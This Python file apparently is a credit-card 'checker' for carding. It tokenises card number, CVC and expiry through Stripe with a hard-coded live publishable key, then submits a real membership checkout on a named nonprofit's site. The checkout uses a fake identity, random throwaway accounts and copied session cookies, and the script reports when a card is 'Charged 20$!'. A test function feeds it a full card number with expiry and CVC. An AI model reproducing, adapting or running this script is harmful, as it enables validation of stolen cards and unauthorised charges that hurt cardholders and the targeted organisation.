from api.parentchecker import ParentChecker
import json
from random import randint
import brotli

URL1 = "https://api.stripe.com/v1/payment_methods"

HEADERS1 = """Host: api.stripe.com
content-length: 711
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
accept: application/json
content-type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?1
user-agent: Mozilla/5.0 (Linux; Android 12; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36
sec-ch-ua-platform: "Android"
origin: https://js.stripe.com
sec-fetch-site: same-site
sec-fetch-mode: cors
sec-fetch-dest: empty
referer: https://js.stripe.com/
accept-encoding: gzip, deflate, br
accept-language: es-US,es;q=0.9"""

POSTDATA1 = "type=card&billing_details[address][line1]=39+Judith+Pl&billing_details[address][line2]=&billing_details[address][city]=East+Islip&billing_details[address][state]=Bahia&billing_details[address][postal_code]=25580-331&billing_details[address][country]=BR&billing_details[name]=Ross+Geller&card[number]={ccn}&card[cvc]={cvc}&card[exp_month]={month}&card[exp_year]={year}&guid=738f722b-e037-42ee-bca5-25b29414eacfa9470e&muid=6c8e8d3d-936b-4d85-8da2-7e22af6ffe898d0d34&sid=1fbfe770-80ae-4fe4-9459-da0437abe2ee5f6502&payment_user_agent=stripe.js%2Fc8e99151a%3B+stripe-js-v3%2Fc8e99151a&time_on_page=234533&key=pk_live_51ICTOuEim9X2TzOHMFEC6uwbBOg3dTcbMUaZxw8oXe5RCNzeIZTLMWWPcdfQabhi8DiTijxhsEfG72DEUDNovyIh00JbsX5jwg"

URL2 = "https://lerachapter.org/dclera/membership-account/membership-checkout/?level=5"

HEADERS2 = """Host: lerachapter.org
content-length: 709
cache-control: max-age=0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
sec-ch-ua-mobile: ?1
sec-ch-ua-platform: "Android"
upgrade-insecure-requests: 1
origin: https://lerachapter.org
content-type: application/x-www-form-urlencoded
user-agent: Mozilla/5.0 (Linux; Android 12; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
sec-fetch-site: same-origin
sec-fetch-mode: navigate
sec-fetch-user: ?1
sec-fetch-dest: document
referer: https://lerachapter.org/dclera/membership-account/membership-checkout/?level=5
accept-encoding: gzip, deflate, br
accept-language: es-US,es;q=0.9"""

# format: rnum(random number), token, ccn, month, year
POSTDATA2 = "level=5&checkjavascript=1&username=random{rnum}&password=Password%2869%29&password2=Password%2869%29&first_name=Ross&last_name=Geller&bemail=random{rnum}%40gmail.com&bconfirmemail=random{rnum}%40gmail.com&fullname=&company=Self-employed&position=Null&primary-perpsective=academic&memberyear=2+years&city=East+Islip&state=Bahia&attorney=no&biography=&gateway=stripe&bfirstname=Ross&blastname=Geller&baddress1=39+Judith+Pl&baddress2=&bcity=East+Islip&bstate=Bahia&bzipcode=25580-331&bcountry=BR&bphone=6312776049&CardType={card_type}&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id={token}&AccountNumber=XXXXXXXXXXXX{ccn}&ExpirationMonth={month}&ExpirationYear={year}"

COOKIES3 = """cookie: twp_session=151b88c3c5aa72c772d4fa8ed0932f33%7C%7C1641701312%7C%7C1641700952
cookie: PHPSESSID=a1583670339ec52c491c877f7a3c5066
cookie: pmpro_visit=1
cookie: __stripe_mid=6c8e8d3d-936b-4d85-8da2-7e22af6ffe898d0d34
cookie: __stripe_sid=1fbfe770-80ae-4fe4-9459-da0437abe2ee5f6502"""

class Checker(ParentChecker):
    """Checker credit card. :param card(sapared by |)"""

    def __init__(self, card):
        super().__init__(card)
        self.request_1_done = False


    def make_request_1(self):
        url = URL1
        headers = super().format_headers(HEADERS1)
        postdata = POSTDATA1.format(ccn= self.ccn, month= self.month, year= self.year, cvc= self.cvc)

        res = self.session.post(url= url, headers= headers, data= postdata)
        res_json = json.loads(res.text)
        try:
            self.token = res_json["id"]
            self.card_type = res_json["card"]["brand"]
            self.request_1_done = True
            return self.token
        except KeyError:
            return "Error: " + res_json["error"]["message"]


    def make_request_2(self):
        """2nd request. return: result"""
        if self.token == None:
            return
        url = URL2
        headers = super().format_headers(HEADERS2)
        postdata = POSTDATA2.format(token= self.token, ccn= self.ccn[-4:], month= self.month, year= self.year, card_type= self.card_type, rnum= randint(1111, 99999))

        super().add_cookies(COOKIES3)

        res = self.session.post(url= url, headers= headers, data= postdata)
        result = res.text #brotli.decompress(res.content)
        try:
            result = result.split(r'ass="pmpro_message pmpro_error">', maxsplit= 1)[1].split(r"</div>", maxsplit= 1)[0]
            return result
        except IndexError:
            with open("res.html", "w") as file:
                file.write(result)
            return "Success. Charged 20$!"




def test():
    checker = Checker("5178052520772456|11|2024|601")
    print(checker.make_request_1())
    print(checker.make_request_2())

if __name__== "__main__":
    test()
